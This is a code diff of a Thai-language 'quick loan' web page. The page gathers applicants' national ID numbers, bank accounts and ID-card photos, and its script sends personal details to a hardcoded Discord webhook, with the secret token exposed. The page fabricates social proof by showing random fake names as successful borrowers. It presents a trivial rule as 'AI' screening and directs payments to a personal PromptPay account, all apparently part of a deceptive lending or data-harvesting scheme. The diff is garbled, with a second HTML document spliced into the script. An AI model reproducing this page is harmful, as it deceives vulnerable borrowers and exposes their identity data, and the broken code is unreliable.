@@ -3,152 +3,895 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ระบบชำระเงิน PromptPay</title>
-    <!-- โหลด Tailwind CSS เพื่อความสวยงาม -->
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>บริการสินเชื่อเงินด่วน พะเยา</title>
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#dc2626">
     <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Prompt', sans-serif; }
+        :root {
+            --primary: #dc2626;
+            --primary-hover: #b91c1c;
+            --dark: #0f172a;
+            --light: #f8fafc;
+            --green: #059669;
+            --green-hover: #047857;
+            --blue: #2563eb;
+            --border: #e2e8f0;
+            --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.08);
+        }
+
+        * { box-sizing: border-box; font-family: 'Prompt', sans-serif; margin: 0; padding: 0; }
+        body { background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%); color: var(--dark); line-height: 1.6; padding-top: 50px; min-height: 100vh; padding-bottom: 40px; }
+
+        .top-app-banner {
+            position: fixed; top: 0; left: 0; width: 100%;
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            color: #fff; padding: 12px 20px; text-align: center; font-size: 0.88rem;
+            z-index: 3000; display: flex; justify-content: center; align-items: center; gap: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        .top-app-banner button {
+            background: var(--green); color: white; padding: 4px 14px; border: none;
+            border-radius: 20px; font-weight: 600; font-size: 0.8rem; cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+        }
+        .top-app-banner button:hover { background: var(--green-hover); transform: scale(1.05); }
+
+        .page-wrapper { max-width: 800px; margin: 25px auto; display: flex; flex-direction: column; gap: 25px; padding: 0 20px; }
+        .main-container { background: white; padding: 35px; border-radius: 16px; box-shadow: var(--shadow); border: 1px solid rgba(255,255,255,0.8); }
+        
+        .live-status { background: #fef2f2; padding: 12px 15px; border-radius: 10px; font-size: 0.85rem; margin-bottom: 20px; border-left: 4px solid var(--primary); color: #991b1b; }
+
+        .tab-menu { display: flex; gap: 10px; margin-bottom: 30px; background: #f1f5f9; padding: 6px; border-radius: 12px; }
+        .tab-btn { flex: 1; padding: 12px; border: none; background: transparent; color: #64748b; font-weight: 600; border-radius: 8px; cursor: pointer; font-size: 0.95rem; transition: all 0.3s ease; }
+        .tab-btn.active { background: white; color: var(--primary); box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+
+        .tab-content { display: none; animation: fadeIn 0.4s ease-in-out; }
+        .tab-content.active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 { color: var(--dark); font-size: 1.6rem; margin-bottom: 6px; font-weight: 700; }
+        .subtitle { color: #64748b; font-size: 0.95rem; margin-bottom: 25px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
+
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 0.9rem; color: #334155; }
+        input, select, textarea { width: 100%; padding: 12px 16px; border: 1.5px solid var(--border); border-radius: 10px; font-size: 0.95rem; background: #fff; transition: all 0.2s; }
+        input:focus, select:focus, textarea:focus { border-color: var(--blue); outline: none; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
+        .helper-text { font-size: 0.8rem; color: #64748b; margin-top: 6px; display: block; }
+
+        .section-title { font-size: 1.05rem; font-weight: 600; color: var(--dark); margin: 25px 0 12px 0; border-left: 4px solid var(--primary); padding-left: 10px; }
+
+        /* ส่วนกล้องถ่ายรูป */
+        .upload-box { background: #f8fafc; border: 1.5px dashed var(--border); padding: 15px; border-radius: 10px; margin-bottom: 10px; }
+        .camera-btn { background: var(--blue); color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 0.85rem; font-weight: 600; cursor: pointer; margin-top: 8px; display: inline-flex; align-items: center; gap: 6px; transition: background 0.2s; }
+        .camera-btn:hover { background: #1d4ed8; }
+        .preview-img { max-width: 100%; height: 100px; object-fit: cover; border-radius: 6px; margin-top: 10px; display: none; border: 1px solid var(--border); }
+
+        .btn-group { display: flex; gap: 12px; margin-top: 30px; }
+        button.action-btn { padding: 14px 20px; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; border: none; flex: 1; transition: all 0.2s; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .btn-next, .btn-submit, .btn-pay { background: var(--green); color: white; }
+        .btn-next:hover, .btn-submit:hover, .btn-pay:hover { background: var(--green-hover); transform: translateY(-2px); box-shadow: 0 6px 15px rgba(5, 150, 105, 0.25); }
+        .btn-prev { background: #f1f5f9; color: #475569; border: 1.5px solid var(--border); }
+        .btn-prev:hover { background: #e2e8f0; }
+
+        .qr-container { text-align: center; background: #f8fafc; padding: 20px; border-radius: 12px; border: 1px dashed var(--border); margin-bottom: 20px; }
+        .qr-container img { width: 180px; height: 180px; object-fit: contain; margin-bottom: 10px; border-radius: 8px; }
+
+        .captcha-box { background: #f1f5f9; padding: 15px; border-radius: 10px; border: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; gap: 15px; margin-bottom: 15px; }
+        .captcha-box span { font-weight: 700; color: var(--dark); font-size: 1.05rem; }
+
+        .calculator-section { background: white; padding: 25px; border-radius: 16px; box-shadow: var(--shadow); border: 1px solid rgba(255,255,255,0.8); }
+        .accordion-header { background: #f8fafc; border: 1px solid var(--border); padding: 15px 20px; border-radius: 12px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; font-weight: 600; font-size: 1rem; color: var(--dark); transition: background 0.2s; }
+        .accordion-header:hover { background: #f1f5f9; }
+        .accordion-body { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; }
+        .accordion-body.show { max-height: 500px; transition: max-height 0.3s ease-in; }
+        .calc-box { background: #f8fafc; border: 1px solid var(--border); padding: 18px; border-radius: 12px; margin-top: 15px; }
+        .calc-result { background: white; padding: 12px; border-radius: 8px; margin-top: 12px; font-size: 0.85rem; border: 1px solid var(--border); }
+        .calc-result p { margin-bottom: 6px; display: flex; justify-content: space-between; }
+        .calc-result span { font-weight: 600; color: var(--primary); }
+
+        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(15,23,42,0.65); backdrop-filter: blur(5px); justify-content: center; align-items: center; padding: 20px; opacity: 0; transition: opacity 0.3s ease; }
+        .modal.show { display: flex; opacity: 1; }
+        .modal-content { background: white; padding: 35px 25px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; box-shadow: 0 20px 35px rgba(0,0,0,0.2); position: relative; transform: scale(0.8); transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); }
+        .modal.show .modal-content { transform: scale(1); }
+        .close-x { position: absolute; top: 15px; right: 18px; font-size: 1.4rem; cursor: pointer; color: #94a3b8; font-weight: bold; transition: color 0.2s; }
+        .close-x:hover { color: var(--dark); }
+
+        .btn-line-direct { background: #06c755; color: white; text-decoration: none; display: block; padding: 12px; border-radius: 10px; font-weight: 600; margin-top: 15px; transition: background 0.2s; }
+        .btn-line-direct:hover { background: #05b34c; }
+
+        .floating-line { position: fixed; bottom: 20px; right: 20px; background: #06c755; color: white; padding: 12px 20px; border-radius: 50px; text-decoration: none; box-shadow: 0 8px 20px rgba(6, 199, 85, 0.3); z-index: 1000; font-weight: 600; display: flex; align-items: center; gap: 8px; transition: transform 0.2s; }
+        .floating-line:hover { transform: scale(1.05); }
+
+        .step-indicators { display: flex; justify-content: space-between; margin-bottom: 30px; position: relative; }
+        .step-indicators::before { content: ''; position: absolute; top: 15px; left: 10%; right: 10%; height: 2px; background: #e2e8f0; z-index: 1; }
+        .step-ind { position: relative; z-index: 2; text-align: center; flex: 1; }
+        .step-num { width: 32px; height: 32px; border-radius: 50%; background: #cbd5e1; color: white; display: flex; align-items: center; justify-content: center; margin: 0 auto 6px; font-weight: 600; font-size: 0.85rem; transition: background 0.3s; }
+        .step-ind.active .step-num { background: var(--primary); }
+        .step-ind.completed .step-num { background: var(--green); }
+        .step-ind span { font-size: 0.75rem; color: #64748b; font-weight: 500; }
+        .form-step { display: none; }
+        .form-step.active { display: block; }
+
+        /* Modal เปิดกล้องมือถือ */
+        #cameraModal { display: none; position: fixed; z-index: 4000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; flex-direction: column; padding: 20px; }
+        #cameraVideo { width: 100%; max-width: 400px; border-radius: 12px; background: #000; }
+        .cam-controls { display: flex; gap: 10px; margin-top: 15px; }
+        .cam-controls button { padding: 10px 20px; border-radius: 8px; font-weight: 600; border: none; cursor: pointer; }
     </style>
 </head>
+<body>
+
+    <div class="top-app-banner" id="installBanner" style="display: none;">
+        <span>📱 ติดตั้งแอปไว้ใช้งานบนหน้าจอหลักมือถือได้เลย</span>
+        <button id="installBtn">ติดตั้งแอป</button>
+    </div>
+
+<div class="page-wrapper">
+    <div class="main-container">
+        <div class="live-status" id="live-status">กำลังโหลดสถานะระบบ...</div>
+
+        <div class="tab-menu">
+            <button class="tab-btn active" onclick="switchTab('apply')">📝 สมัครสินเชื่อใหม่</button>
+            <button class="tab-btn" onclick="switchTab('payment')">💳 แนบสลิปชำระเงิน</button>
+        </div>
+
+        <!-- TAB 1: สมัครสินเชื่อ -->
+        <div class="tab-content active" id="tab-apply">
+            <h1>ระบบยื่นขอสินเชื่อออนไลน์</h1>
+            <div class="subtitle">กรอกข้อมูลตามขั้นตอนเพื่อพิจารณาอนุมัติวงเงินด่วน</div>
+
+            <div class="step-indicators">
+                <div class="step-ind active" id="ind-1"><div class="step-num">1</div><span>วงเงินกู้</span></div>
+                <div class="step-ind" id="ind-2"><div class="step-num">2</div><span>ที่อยู่ & อาชีพ</span></div>
+                <div class="step-ind" id="ind-3"><div class="step-num">3</div><span>ยืนยันตัวตน</span></div>
+            </div>
+
+            <form id="loanForm">
+                <div class="form-step active" id="step-1">
+                    <div class="section-title" style="margin-top: 0;">วงเงินที่ต้องการกู้จริง</div>
+                    <div class="form-group">
+                        <label for="applyAmount">เลือกจำนวนเงินที่ต้องการขอกู้</label>
+                        <select id="applyAmount" required>
+                            <option value="">-- กรุณาเลือกวงเงิน --</option>
+                            <option value="1000">1,000 บาท</option>
+                            <option value="3000">3,000 บาท</option>
+                            <option value="5000">5,000 บาท</option>
+                            <option value="10000">10,000 บาท</option>
+                            <option value="20000">20,000 บาท</option>
+                            <option value="30000">30,000 บาท</option>
+                            <option value="50000">50,000 บาท</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="applyDays">ระยะเวลาผ่อนชำระที่ต้องการ</label>
+                        <select id="applyDays" required>
+                            <option value="">-- เลือกระยะเวลา --</option>
+                            <option value="7 วัน">7 วัน</option>
+                            <option value="15 วัน">15 วัน</option>
+                            <option value="30 วัน">30 วัน</option>
+                            <option value="60 วัน">60 วัน</option>
+                        </select>
+                    </div>
+
+                    <div class="section-title">ข้อมูลส่วนตัวผู้กู้</div>
+                    <div class="form-group">
+                        <label for="fullname">ชื่อ - นามสกุลจริง (ตามบัตรประชาชน)</label>
+                        <input type="text" id="fullname" placeholder="ระบุชื่อและนามสกุล" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="idCardNumber">เลขประจำตัวประชาชน (13 หลัก)</label>
+                        <input type="text" id="idCardNumber" placeholder="ระบุเลขบัตรประชาชน 13 หลัก" maxlength="13" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">เบอร์โทรศัพท์มือถือ (10 หลัก)</label>
+                        <input type="tel" id="phone" placeholder="0812345678" maxlength="10" required>
+                    </div>
+                    <div class="btn-group">
+                        <button type="button" class="action-btn btn-next" onclick="nextStep(1)">ดำเนินการต่อ ➔</button>
+                    </div>
+                </div>
+
+                <div class="form-step" id="step-2">
+                    <div class="section-title" style="margin-top:0;">ที่อยู่ & อาชีพหลัก</div>
+                    <div class="form-group">
+                        <label for="occupation">อาชีพ / แหล่งรายได้</label>
+                        <select id="occupation" required>
+                            <option value="">-- เลือกอาชีพ --</option>
+                            <option value="ค้าขาย/ธุรกิจส่วนตัว">ค้าขาย / ธุรกิจส่วนตัว</option>
+                            <option value="พนักงานประจำ/ลูกจ้าง">พนักงานประจำ / ลูกจ้าง</option>
+                            <option value="เกษตรกร">เกษตรกร</option>
+                            <option value="รับจ้างทั่วไป">รับจ้างทั่วไป</option>
+                            <option value="ว่างงาน">ว่างงาน (ไม่ผ่านเกณฑ์)</option>
+                        </select>
+                        <small class="helper-text">*ระบบ AI จะประเมินคุณสมบัติจากอาชีพและเงื่อนไขการกู้ทันที</small>
+                    </div>
+                    <div class="form-group">
+                        <label for="village">ชื่อตลาด / ชุมชน</label>
+                        <input type="text" id="village" placeholder="เช่น ตลาดสดเทศบาล" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="address">รายละเอียดที่อยู่</label>
+                        <textarea id="address" rows="2" placeholder="บ้านเลขที่, ตำบล, อำเภอ" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="bankName">ธนาคารรับเงิน</label>
+                        <select id="bankName" required>
+                            <option value="">-- เลือกธนาคาร --</option>
+                            <option value="กสิกรไทย">ธนาคารกสิกรไทย (KBANK)</option>
+                            <option value="ไทยพาณิชย์">ธนาคารไทยพาณิชย์ (SCB)</option>
+                            <option value="กรุงไทย">ธนาคารกรุงไทย (KTB)</option>
+                            <option value="ออมสิน">ธนาคารออมสิน (GSB)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="accountNumber">เลขที่บัญชีธนาคาร</label>
+                        <input type="text" id="accountNumber" placeholder="เลขบัญชี" required>
+                    </div>
+                    <div class="btn-group">
+                        <button type="button" class="action-btn btn-prev" onclick="prevStep(2)">⬅ ย้อนกลับ</button>
+                        <button type="button" class="action-btn btn-next" onclick="nextStep(2)">ดำเนินการต่อ ➔</button>
+                    </div>
+                </div>
+
+                <div class="form-step" id="step-3">
+                    <div class="section-title" style="margin-top:0;">อัปโหลดเอกสารยืนยันตัวตน (2 รูป)</div>
+                    
+                    <!-- รูปที่ 1: รูปคู่บัตรประชาชน -->
+                    <div class="form-group upload-box">
+                        <label>1. รูปถ่ายคู่บัตรประชาชน</label>
+                        <input type="file" id="idCardSelfie" accept="image/*" onchange="previewFile(this, 'previewSelfie')">
+                        <button type="button" class="camera-btn" onclick="openCamera('idCardSelfie', 'previewSelfie')">📷 เปิดกล้องถ่ายภาพ</button>
+                        <img id="previewSelfie" class="preview-img">
+                    </div>
+
+                    <!-- รูปที่ 2: หน้าบัตรประชาชน -->
+                    <div class="form-group upload-box">
+                        <label>2. รูปถ่ายบัตรประชาชน (ด้านหน้า)</label>
+                        <input type="file" id="idCardFront" accept="image/*" onchange="previewFile(this, 'previewFront')">
+                        <button type="button" class="camera-btn" onclick="openCamera('idCardFront', 'previewFront')">📷 เปิดกล้องถ่ายภาพ</button>
+                        <img id="previewFront" class="preview-img">
+                    </div>
+
+                    <!-- ระบบแคปช่า -->
+                    <div class="section-title">ยืนยันความปลอดภัย (Captcha)</div>
+                    <div class="captcha-box">
+                        <span id="captchaQuestion">กรุณารอสักครู่...</span>
+                        <input type="number" id="captchaAnswer" placeholder="ใส่คำตอบ" style="max-width: 140px; margin: 0;" required>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="action-btn btn-prev" onclick="prevStep(3)">⬅ ย้อนกลับ</button>
+                        <button type="submit" class="action-btn btn-submit" id="submitBtn">🔒 ยืนยันและส่งข้อมูล</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- TAB 2: แนบสลิปชำระเงิน -->
+        <div class="tab-content" id="tab-payment">
+            <h1>แนบสลิปชำระเงินค่างวด</h1>
+            <div class="subtitle">สแกน QR Code เพื่อชำระเงินผ่านพร้อมเพย์ จากนั้นระบุยอดเงินและแนบสลิปหลักฐานการโอน</div>
+
+            <div class="qr-container">
+                <img src="https://promptpay.io/0658351446.png" alt="QR Code พร้อมเพย์">
+                <p style="font-size: 0.9rem; font-weight: 600; color: var(--dark);">พร้อมเพย์: 065-835-1446</p>
+                <small class="helper-text">ชื่อบัญชี: คณิน มะลิวัน</small>
+            </div>
+
+            <form id="paymentForm" onsubmit="submitPayment(event)">
+                <div class="form-group">
+                    <label for="payAmount">ยอดเงินที่ชำระ (บาท)</label>
+                    <input type="number" id="payAmount" value="400" min="10" step="10" required>
+                </div>
+                <div class="form-group upload-box">
+                    <label>แนบสลิปโอนเงิน</label>
+                    <input type="file" id="slipImage" accept="image/*" onchange="previewFile(this, 'previewSlip')" required>
+                    <button type="button" class="camera-btn" onclick="openCamera('slipImage', 'previewSlip')">📷 ถ่ายรูปสลิป</button>
+                    <img id="previewSlip" class="preview-img">
+                </div>
+
+                <div class="btn-group">
+                    <button type="submit" class="action-btn btn-pay">📤 แนบสลิป</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- ส่วนตารางทดลองคำนวณแบบพับเปิด-ปิดได้ -->
+    <div class="calculator-section">
+        <div class="accordion-header" onclick="toggleCalculator()">
+            <span>🧮 ตารางทดลองคำนวณค่างวด</span>
+            <span id="arrowIcon">▼</span>
+        </div>
+        <div class="accordion-body" id="calcAccordionBody">
+            <div class="calc-box">
+                <h4>💡 คำนวณยอดชำระรายวัน</h4>
+                <div class="form-group" style="margin-bottom: 10px;">
+                    <label style="font-size: 0.8rem;">วงเงินกู้ (บาท)</label>
+                    <input type="number" id="testAmount" value="5000" min="1000" max="50000" step="500" oninput="testCalculate()" style="padding: 8px; font-size: 0.85rem;">
+                </div>
+                <div class="form-group" style="margin-bottom: 10px;">
+                    <label style="font-size: 0.8rem;">ระยะเวลาผ่อน</label>
+                    <select id="testDays" oninput="testCalculate()" style="padding: 8px; font-size: 0.85rem;">
+                        <option value="7">7 วัน (ดอกเบี้ย 20%)</option>
+                        <option value="15">15 วัน (ดอกเบี้ย 20%)</option>
+                        <option value="30" selected>30 วัน (ดอกเบี้ย 20%)</option>
+                        <option value="60">60 วัน (ดอกเบี้ย 20%)</option>
+                    </select>
+                </div>
+                <div class="calc-result" id="testResultBox"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal เปิดกล้องมือถือ/คอมพิวเตอร์ -->
+<div id="cameraModal">
+    <video id="cameraVideo" autoplay playsinline></video>
+    <div class="cam-controls">
+        <button type="button" style="background: var(--green); color: white;" onclick="capturePhoto()">📸 ถ่ายภาพ</button>
+        <button type="button" style="background: #64748b; color: white;" onclick="closeCameraModal()">❌ ปิดกล้อง</button>
+    </div>
+</div>
+
+<!-- Popup Modal แสดงผลลัพธ์ AI คัดกรอง -->
+<div class="modal" id="successModal">
+    <div class="modal-content">
+        <span class="close-x" onclick="closeModal()">&times;</span>
+        <h3 id="modalTitle">ผลการประเมิน</h3>
+        <p style="color: #475569; font-size: 0.9rem; margin-bottom: 15px; margin-top: 10px;" id="modalDesc">
+            กำลังประมวลผล...
+        </p>
+        <a href="https://lin.ee/8YLly76" target="_blank" class="btn-line-direct" id="modalLineBtn">💬 ติดต่อเจ้าหน้าที่ผ่าน LINE</a>
+    </div>
+</div>
+
+<a href="https://lin.ee/8YLly76" target="_blank" class="floating-line">💬 ติดต่อผ่าน LINE</a>
+
+<script>
+    // 🔗 ตั้งค่า Discord Webhook URL ของคุณที่ใส่ไว้เรียบร้อยแล้ว
+    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1475367009700282379/3LerCdbu5Kc1TuCl19NWjozyVCFy8rcQdIJKrVN5LkebFotPTZo8LX4eBvDEdZgwx0g0";
+
+    let currentInputId = null;
+    let currentPreviewId = null;
+    let videoStream = null;
+
+    // --- ระบบกล้องถ่ายรูป ---
+    function openCamera(inputId, previewId) {
+        currentInputId = inputId;
+        currentPreviewId = previewId;
+        const modal = document.getElementById('cameraModal');
+        const video = document.getElementById('cameraVideo');
+        modal.style.display = 'flex';
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+            .then(stream => {
+                videoStream = stream;
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                alert('ไม่สามารถเปิดกล้องได้ กรุณาอนุญาตการใช้งานกล้องในเบราว์เซอร์');
+                modal.style.display = 'none';
+            });
+    }
+
+    function capturePhoto() {
+        const video = document.getElementById('cameraVideo');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+            const file = new File([blob], "captured_image.jpg", { type: "image/jpeg" });
+            const dataTransfer = new DataTransfer();
+            dataTransfer.items.add(file);
+            document.getElementById(currentInputId).files = dataTransfer.files;
+
+            // พรีวิวรูปภาพทันที
+            const preview = document.getElementById(currentPreviewId);
+            preview.src = URL.createObjectURL(file);
+            preview.style.display = 'block';
+
+            closeCameraModal();
+        }, 'image/jpeg', 0.85);
+    }
+
+    function closeCameraModal() {
+        if (videoStream) {
+            videoStream.getTracks().forEach(track => track.stop());
+        }
+        document.getElementById('cameraModal').style.display = 'none';
+    }
+
+    function previewFile(input, previewId) {
+        const preview = document.getElementById(previewId);
+        if (input.files && input.files[0]) {
+            preview.src = URL.createObjectURL(input.files[0]);
+            preview.style.display = 'block';
+        }
+    }
+
+    // --- ระบบแคปช่าสุ่มตัวเลข ---
+    let num1, num2, correctCaptcha;
+    function generateCaptcha() {
+        num1 = Math.floor(Math.random() * 10) + 1;
+        num2 = Math.floor(Math.random() * 10) + 1;
+        correctCaptcha = num1 + num2;
+        document.getElementById('captchaQuestion').innerText = `ยืนยันตัวเลข: ${num1} + ${num2} = ?`;
+    }
+    generateCaptcha();
+
+    // PWA Service Worker
+    if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+            navigator.serviceWorker.register('sw.js').catch(() => {});
+        });
+    }
+
+    let deferredPrompt;
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        deferredPrompt = e;
+        document.getElementById('installBanner').style.display = 'flex';
+    });
+
+    document.getElementById('installBtn').addEventListener('click', async () => {
+        if (deferredPrompt) {
+            deferredPrompt.prompt();
+            const { outcome } = await deferredPrompt.userChoice;
+            if (outcome === 'accepted') {
+                document.getElementById('installBanner').style.display = 'none';
+            }
+            deferredPrompt = null;
+        }
+    });
+
+    function switchTab(tabName) {
+        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+
+        if (tabName === 'apply') {
+            document.querySelectorAll('.tab-btn')[0].classList.add('active');
+            document.getElementById('tab-apply').classList.add('active');
+        } else {
+            document.querySelectorAll('.tab-btn')[1].classList.add('active');
+            document.getElementById('tab-payment').classList.add('active');
+        }
+    }
+
+    function toggleCalculator() {
+        const body = document.getElementById('calcAccordionBody');
+        const arrow = document.getElementById('arrowIcon');
+        body.classList.toggle('show');
+        arrow.innerText = body.classList.contains('show') ? '▲' : '▼';
+    }
+
+    function testCalculate() {
+        const amount = parseFloat(document.getElementById('testAmount').value) || 0;
+        const days = parseInt(document.getElementById('testDays').value);
+        const interest = amount * 0.20;
+        const total = amount + interest;
+        const perDay = total / days;
+
+        document.getElementById('testResultBox').innerHTML = `
+            <p>เงินต้น: <span>${amount.toLocaleString()} บ.</span></p>
+            <p>ดอกเบี้ย (20%): <span>+${interest.toLocaleString()} บ.</span></p>
+            <p style="border-top: 1px dashed #cbd5e1; padding-top: 4px; margin-top: 4px;">รวมต้น+ดอก: <span>${total.toLocaleString()} บ.</span></p>
+            <p>เฉลี่ยรายวัน: <span>~${perDay.toFixed(0).toLocaleString()} บ./วัน</span></p>
+        `;
+    }
+    testCalculate();
+
+    const names = ["คุณสมชาย", "คุณวิภา", "คุณมานะ", "คุณพรทิพย์", "คุณธนพล"];
+    const districts = ["ตลาดแม่ใจ", "ตลาดสดเทศบาล", "ตลาดดอกคำใต้", "ตลาดจุน"];
+    function updateStatus() {
+        const name = names[Math.floor(Math.random() * names.length)];
+        const dist = districts[Math.floor(Math.random() * districts.length)];
+        document.getElementById('live-status').innerText = `🛡️ ${name} (${dist}) ทำรายการสำเร็จ`;
+    }
+    setInterval(updateStatus, 6000);
+    updateStatus();
+
+    function nextStep(current) {
+        if (current === 1) {
+            const idCard = document.getElementById('idCardNumber').value;
+            const phone = document.getElementById('phone').value;
+            if (idCard.length !== 13) { alert('กรุณากรอกเลขบัตรประชาชน 13 หลักให้ถูกต้อง'); return; }
+            if (phone.length !== 10) { alert('กรุณากรอกเบอร์โทรศัพท์ 10 หลัก'); return; }
+        }
+        document.getElementById(`step-${current}`).classList.remove('active');
+        document.getElementById(`ind-${current}`).classList.remove('active');
+        document.getElementById(`ind-${current}`).classList.add('completed');
+
+        const next = current + 1;
+        document.getElementById(`step-${next}`).classList.add('active');
+        document.getElementById(`ind-${next}`).classList.add('active');
+    }
+
+    function prevStep(current) {
+        document.getElementById(`step-${current}`).classList.remove('active');
+        document.getElementById(`ind-${current}`).classList.remove('active');
+        const prev = current - 1;
+        document.getElementById(`step-${prev}`).classList.add('active');
+        document.getElementById(`ind-${prev}`).classList.add('active');
+        document.getElementById(`ind-${prev}`).classList.remove('completed');
+    }
+
+    // ฟอร์มสมัคร + AI คัดกรอง + แคปช่า
+    document.getElementById('loanForm').onsubmit = function(e) {
+        e.preventDefault();
+        
+        // เช็คแคปช่า
+        const userCaptcha = parseInt(document.getElementById('captchaAnswer').value);
+        if (userCaptcha !== correctCaptcha) {
+            alert('ตอบคำถามยืนยันความปลอดภัย (Captcha) ไม่ถูกต้อง กรุณาลองใหม่');
+            generateCaptcha();
+            document.getElementById('captchaAnswer').value = '';
+            return;
+        }
+
+        const fullname = document.getElementById('fullname').value;
+        const phone = document.getElementById('phone').value;
+        const amount = parseInt(document.getElementById('applyAmount').value);
+        const days = document.getElementById('applyDays').value;
+        const occupation = document.getElementById('occupation').value;
+
+        // เงื่อนไข AI คัดกรอง
+        let isPassed = true;
+        let reason = "ผ่านเกณฑ์การพิจารณาเบื้องต้น";
+
+        if (occupation === "ว่างงาน") {
+            isPassed = false;
+            reason = "ไม่ผ่านเกณฑ์: สถานะว่างงานไม่เข้าเงื่อนไขการอนุมัติ";
+        } else if ((amount <= 3000) && (days === "60 วัน")) {
+            isPassed = false;
+            reason = "ไม่ผ่านเกณฑ์: ยอดกู้น้อยเกินไปแต่เลือกผ่อนระยะยาวเกินกำหนด";
+        }
+
+        const statusIcon = isPassed ? "🟢 **[ผ่านเกณฑ์เบื้องต้น]**" : "🔴 **[ไม่ผ่านเกณฑ์ / ตีกลับ]**";
+        
+        const payload = {
+            content: `🤖 **[AI ประเมินผลสินเชื่อ]**\n${statusIcon}\n👤 ชื่อ: ${fullname}\n📞 เบอร์โทร: ${phone}\n💼 อาชีพ: ${occupation}\n💰 วงเงิน: ${amount} บาท (${days})\n📝 ผลประเมิน: ${reason}`
+        };
+
+        if (WEBHOOK_URL && WEBHOOK_URL.startsWith("http")) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error(err));
+        }
+
+        const modalTitle = document.getElementById('modalTitle');
+        const modalDesc = document.getElementById('modalDesc');
+        const modalLineBtn = document.getElementById('modalLineBtn');
+
+        if (isPassed) {
+            modalTitle.innerHTML = "🟢 ผ่านการประเมินเบื้องต้น!";
+            modalTitle.style.color = "var(--green)";
+            modalDesc.innerHTML = `ระบบ AI ตรวจสอบข้อมูลแล้ว <strong>ผ่านเกณฑ์</strong> <br><br>ข้อมูลถูกส่งไปยัง Discord เพื่อให้เจ้าหน้าที่ตรวจสอบและเตรียมติดต่อกลับครับ`;
+            modalLineBtn.style.display = "block";
+        } else {
+            modalTitle.innerHTML = "🔴 ไม่ผ่านการพิจารณาเบื้องต้น";
+            modalTitle.style.color = "var(--primary)";
+            modalDesc.innerHTML = `ขออภัยครับ ระบบ AI ประเมินแล้วพบว่าไม่ผ่านเกณฑ์เงื่อนไข: <br><em>${reason}</em><br><br>คำขอของคุณถูกบันทึกสถานะไม่ผ่านไว้ในระบบ`;
+            modalLineBtn.style.display = "none";
+        }
+
+        document.getElementById('successModal').classList.add('show');
+    };
+
+    <!DOCTYPE html>
+
+<html lang="th">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>ระบบชำระเงิน PromptPay</title>
+
+    <!-- โหลด Tailwind CSS เพื่อความสวยงาม -->
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+
+        body { font-family: 'Prompt', sans-serif; }
+
+    </style>
+
+</head>
+
 <body class="bg-slate-100 flex items-center justify-center min-h-screen">
 
+
+
   <div class="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full mx-4">
+
     <div class="text-center mb-6">
+
       <h2 class="text-2xl font-bold text-slate-800">ชำระเงินค่าสินค้า / บริการ</h2>
+
       <p class="text-sm text-slate-500 mt-1">กรุณาระบุยอดเงินที่ต้องการชำระด้านล่าง</p>
+
     </div>
+
+
 
     <!-- ฟอร์มกรอกจำนวนเงินบนหน้าหลัก -->
+
     <div class="mb-6">
+
       <label class="block text-sm font-medium text-slate-700 mb-2">จำนวนเงิน (บาท)</label>
+
       <div class="relative">
